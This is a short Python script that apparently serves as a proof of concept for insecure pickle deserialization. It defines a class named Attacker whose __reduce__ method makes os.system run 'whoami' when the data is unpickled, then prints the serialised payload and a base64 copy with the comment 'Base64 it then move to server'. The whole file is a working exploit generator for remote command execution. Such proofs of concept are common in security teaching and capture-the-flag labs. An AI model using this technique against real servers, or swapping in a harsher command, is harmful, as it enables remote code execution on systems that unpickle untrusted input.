import pickle
import os
import base64

class Attacker(object):
    def __reduce__(self):
        return (os.system,("whoami",))

payload = pickle.dumps(Attacker())
print("Payload =", payload)
print("Base64 it then move to server =", base64.b64encode(payload))